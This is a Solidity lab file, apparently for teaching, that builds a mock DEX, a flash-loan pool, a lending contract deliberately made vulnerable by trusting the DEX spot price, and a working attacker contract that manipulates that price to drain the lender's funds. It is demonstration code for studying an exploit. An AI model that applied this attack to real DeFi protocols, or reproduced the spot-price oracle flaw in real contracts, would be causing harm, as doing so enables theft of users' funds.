// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title MockToken
 * @dev Token básico ERC20 para poder mintear liquidez en las pruebas
 */
contract MockToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/**
 * @title SimpleDEX
 * @dev Un AMM extremadamente básico que calcula precios en base a balances actuales (SPOT)
 */
contract SimpleDEX {
    ERC20 public tokenA;
    ERC20 public tokenB;
    uint256 public reserveA;
    uint256 public reserveB;

    constructor(address _tokenA, address _tokenB) {
        tokenA = ERC20(_tokenA);
        tokenB = ERC20(_tokenB);
    }

    function addLiquidity(uint256 _amountA, uint256 _amountB) external {
        tokenA.transferFrom(msg.sender, address(this), _amountA);
        tokenB.transferFrom(msg.sender, address(this), _amountB);
        reserveA += _amountA;
        reserveB += _amountB;
    }

    // VULNERABILIDAD: Retorna el precio instantáneo basado en las reservas de este bloque.
    // Fácilmente manipulable con un Flash Loan.
    function getPriceOfA() public view returns (uint256) {
        require(reserveA > 0, "Sin liquidez");
        return (reserveB * 1e18) / reserveA;
    }

    // Función simple de intercambio matemático (x * y = k simplificado)
    function swapBforA(uint256 _amountB) external returns (uint256 amountAOut) {
        amountAOut = (_amountB * reserveA) / (reserveB + _amountB);
        tokenB.transferFrom(msg.sender, address(this), _amountB);
        tokenA.transfer(msg.sender, amountAOut);
        reserveB += _amountB;
        reserveA -= amountAOut;
    }
}

/**
 * @title FlashLoanPool
 * @dev Simula protocolos como Aave o dYdX que prestan fondos sin garantía.
 */
contract FlashLoanPool {
    ERC20 public token;
    constructor(address _token) { token = ERC20(_token); }
    
    function flashLoan(uint256 amount, address target) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        
        // 1. Prestar el dinero
        token.transfer(target, amount);
        
        // 2. Dar control al contrato atacante para que use el dinero
        (bool success, ) = target.call(abi.encodeWithSignature("executeFlashLoan()"));
        require(success, "Fallo en la ejecucion del flash loan");
        
        // 3. Exigir que el dinero haya vuelto al final de la ejecucion
        require(token.balanceOf(address(this)) >= balanceBefore, "Flash loan no reembolsado");
    }
}

/**
 * @title VulnerableLending
 * @notice VULNERABLE CONTRACT — Confía en el Spot Price de un DEX
 */
contract VulnerableLending {
    SimpleDEX public dex;
    ERC20 public tokenA; // Colateral
    ERC20 public tokenB; // Activo a pedir prestado

    constructor(address _dex, address _tokenA, address _tokenB) {
        dex = SimpleDEX(_dex);
        tokenA = ERC20(_tokenA);
        tokenB = ERC20(_tokenB);
    }

    function borrow(uint256 _borrowAmount, uint256 _collateralAmount) external {
        // Obtenemos el precio de la fuente manipulable
        uint256 priceA = dex.getPriceOfA();
        
        // Calculamos el valor del colateral usando ese precio roto
        uint256 collateralValue = (_collateralAmount * priceA) / 1e18;
        require(collateralValue >= _borrowAmount, "Colateral insuficiente");

        tokenA.transferFrom(msg.sender, address(this), _collateralAmount);
        tokenB.transfer(msg.sender, _borrowAmount);
    }
}

/**
 * @title FlashLoanAttacker
 * @dev El contrato que orquesta el ataque en una sola transacción
 */
contract FlashLoanAttacker {
    FlashLoanPool public pool;
    SimpleDEX public dex;
    VulnerableLending public lending;
    ERC20 public tokenA;
    ERC20 public tokenB;

    constructor(address _pool, address _dex, address _lending, address _tA, address _tB) {
        pool = FlashLoanPool(_pool);
        dex = SimpleDEX(_dex);
        lending = VulnerableLending(_lending);
        tokenA = ERC20(_tA);
        tokenB = ERC20(_tB);
    }

    function attack() external {
        // Paso 1: Pedir prestados 9000 TokenB
        pool.flashLoan(9000 ether, address(this));
        
        // Paso Final: Enviar ganancias robadas al hacker
        tokenB.transfer(msg.sender, tokenB.balanceOf(address(this)));
    }

    // Esta función es llamada automáticamente por el FlashLoanPool cuando nos entrega el dinero
    function executeFlashLoan() external {
        uint256 loanAmount = tokenB.balanceOf(address(this));
        
        // Paso 2: Romper el precio del DEX vendiendo masivamente TokenB por TokenA
        tokenB.approve(address(dex), loanAmount);
        dex.swapBforA(loanAmount);
        
        // Paso 3: Usar el TokenA obtenido, que ahora tiene un precio inflado falsamente,
        // para pedir prestado TODO el TokenB del protocolo de Lending.
        uint256 tokenABalance = tokenA.balanceOf(address(this));
        tokenA.approve(address(lending), tokenABalance);
        
        uint256 lendingBalance = tokenB.balanceOf(address(lending));
        lending.borrow(lendingBalance, tokenABalance);

        // Paso 4: Devolver los 9000 TokenB originales al Pool
        tokenB.transfer(address(pool), loanAmount);
    }
}